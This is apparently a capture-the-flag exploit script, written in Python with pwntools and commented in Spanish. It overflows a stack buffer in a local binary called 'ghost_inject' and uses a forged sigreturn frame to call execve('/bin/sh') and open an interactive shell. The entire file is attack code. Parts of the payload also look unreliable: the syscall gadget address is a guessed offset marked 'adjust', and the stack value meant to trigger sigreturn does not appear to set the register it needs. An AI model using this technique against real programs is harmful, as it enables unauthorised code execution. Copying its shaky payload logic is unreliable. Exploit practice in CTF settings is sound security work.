#!/usr/bin/env python3
from pwn import *

# Configuración del contexto del binario
exe = './ghost_inject'
context.binary = exe
context.arch = 'amd64'

# Cargar binario
elf = ELF(exe)

# Buscar la cadena "/bin/sh"
binsh_addr = next(elf.search(b'/bin/sh\x00'))
log.success(f"Dirección de '/bin/sh': {hex(binsh_addr)}")

# Número de syscall para sigreturn (x86_64)
sigreturn_syscall = 15

# Construimos un fake sigreturn frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # syscall: execve("/bin/sh", NULL, NULL)
frame.rdi = binsh_addr            # puntero a "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = elf.symbols['setup'] + 0x50  # Ajusta con syscall; usa dirección RWX o `syscall` gadget real
log.info(f"Usando RIP (syscall gadget) en: {hex(frame.rip)}")

# Armamos el payload
payload  = b'A' * 136                     # overflow hasta RIP (buffer[128] + RBP)
payload += p64(15)                        # syscall número 15 (sigreturn)
payload += p64(frame.rip)                # dirección de syscall (retornará aquí)
payload += bytes(frame)                  # el frame completo

# Lanzamos el proceso
io = process(exe)
io.send(payload)
io.interactive()
